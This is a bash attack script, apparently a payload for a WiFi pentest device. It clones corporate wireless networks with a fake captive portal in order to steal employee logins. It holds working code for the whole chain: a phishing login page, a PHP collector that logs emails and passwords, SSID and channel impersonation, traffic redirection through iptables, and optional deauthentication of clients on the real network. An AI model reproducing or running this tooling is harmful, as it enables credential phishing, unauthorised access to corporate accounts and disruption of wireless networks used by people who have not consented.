#!/bin/bash
# Title: Corporate Impersonator
# Author: bad-antics
# Description: Clone corporate WiFi networks with captive portals
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/corpimper"
mkdir -p "$LOOT_DIR"

PROMPT "CORPORATE IMPERSONATOR

Create convincing corporate
WiFi portals to harvest
employee credentials.

Features:
• Auto-detect corp networks
• Brand-specific portals
• Credential capture
• Session hijacking

Press OK to start."

[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }

# Corporate network patterns to look for
CORP_PATTERNS="Corporate|Enterprise|Office|Employee|Staff|Company|Secure|Internal|Private"

SPINNER_START "Scanning for corporate networks..."
timeout 15 airodump-ng wlan0 --write-interval 1 -w /tmp/corpscan --output-format csv 2>/dev/null
SPINNER_STOP

# Find networks matching corporate patterns
CORP_NETS=$(grep -iE "$CORP_PATTERNS" /tmp/corpscan*.csv 2>/dev/null | head -10)
CORP_COUNT=$(echo "$CORP_NETS" | grep -c "WPA\|WEP" 2>/dev/null || echo 0)

PROMPT "Found $CORP_COUNT potential 
corporate networks.

Will create portal matching
selected network branding."

TARGET_NUM=$(NUMBER_PICKER "Target network #:" 1)
TARGET_LINE=$(echo "$CORP_NETS" | sed -n "${TARGET_NUM}p")
TARGET_SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')
TARGET_BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
TARGET_CHANNEL=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')

# Detect company from SSID for portal customization
if echo "$TARGET_SSID" | grep -qi "microsoft"; then
    PORTAL_TYPE="microsoft"
elif echo "$TARGET_SSID" | grep -qi "google"; then
    PORTAL_TYPE="google"
elif echo "$TARGET_SSID" | grep -qi "amazon"; then
    PORTAL_TYPE="amazon"
else
    PORTAL_TYPE="generic"
fi

PROMPT "Target: $TARGET_SSID
Portal: $PORTAL_TYPE style

Creating credential
capture portal..."

# Create portal directory
PORTAL_DIR="/www/corpportal"
mkdir -p "$PORTAL_DIR"

# Generate corporate-style login page
cat > "$PORTAL_DIR/index.html" << 'PORTAL'
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Secure Network Login</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); margin: 0; padding: 20px; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); padding: 40px; max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { max-width: 180px; }
        h2 { color: #333; text-align: center; margin-bottom: 10px; }
        p { color: #666; text-align: center; font-size: 14px; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #0078d4; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 15px; }
        button:hover { background: #006cbd; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
        .secure { color: #107c10; font-size: 12px; text-align: center; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>🔒 Secure WiFi</h1>
        </div>
        <h2>Network Authentication</h2>
        <p>Please sign in with your corporate credentials to access the secure network.</p>
        <form action="/capture.php" method="POST">
            <input type="email" name="email" placeholder="Corporate Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="hidden" name="ssid" value="NETWORK_SSID">
            <button type="submit">Sign In</button>
        </form>
        <p class="secure">🔐 256-bit SSL Encrypted Connection</p>
        <div class="footer">© 2026 IT Security Department</div>
    </div>
</body>
</html>
PORTAL

sed -i "s/NETWORK_SSID/$TARGET_SSID/g" "$PORTAL_DIR/index.html"

# Create PHP capture script
cat > "$PORTAL_DIR/capture.php" << 'CAPTUREPHP'
<?php
$loot = "/mmc/nullsec/corpimper/creds_" . date("Ymd_His") . ".txt";
$data = date("Y-m-d H:i:s") . "\n";
$data .= "Email: " . $_POST['email'] . "\n";
$data .= "Password: " . $_POST['password'] . "\n";
$data .= "SSID: " . $_POST['ssid'] . "\n";
$data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
$data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
$data .= "---\n";
file_put_contents($loot, $data, FILE_APPEND);
header("Location: /success.html");
?>
CAPTUREPHP

# Create success page
cat > "$PORTAL_DIR/success.html" << 'SUCCESS'
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Connected</title>
    <style>
        body { font-family: 'Segoe UI', Arial; background: #1a1a2e; color: white; text-align: center; padding: 50px; }
        .checkmark { font-size: 80px; color: #107c10; }
        h1 { margin-top: 20px; }
    </style>
</head>
<body>
    <div class="checkmark">✓</div>
    <h1>Successfully Connected</h1>
    <p>You now have access to the network.</p>
    <p>This window will close automatically...</p>
    <script>setTimeout(function(){ window.close(); }, 3000);</script>
</body>
</html>
SUCCESS

SPINNER_START "Launching attack..."

# Start access point
hostapd_cli set_config ssid "$TARGET_SSID" 2>/dev/null
hostapd_cli set_config channel "$TARGET_CHANNEL" 2>/dev/null

# Start web server
php -S 0.0.0.0:80 -t "$PORTAL_DIR" &
PHP_PID=$!

# DNS hijack for captive portal
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80

# Optional deauth
DEAUTH=$(CONFIRMATION_DIALOG "Deauth clients from
real network to force
reconnection to you?")

if [ "$DEAUTH" = "0" ]; then
    aireplay-ng --deauth 5 -a "$TARGET_BSSID" wlan1 2>/dev/null &
fi

SPINNER_STOP

DURATION=$(NUMBER_PICKER "Duration (minutes):" 30)
SECONDS=$((DURATION * 60))

SPINNER_START "Attack running for ${DURATION}m..."
sleep $SECONDS
SPINNER_STOP

# Cleanup
kill $PHP_PID 2>/dev/null
iptables -t nat -F

CRED_COUNT=$(cat "$LOOT_DIR"/creds_*.txt 2>/dev/null | grep -c "Email:" || echo 0)

PROMPT "Attack Complete!

Captured: $CRED_COUNT credentials

Saved to: $LOOT_DIR

Press OK to exit."
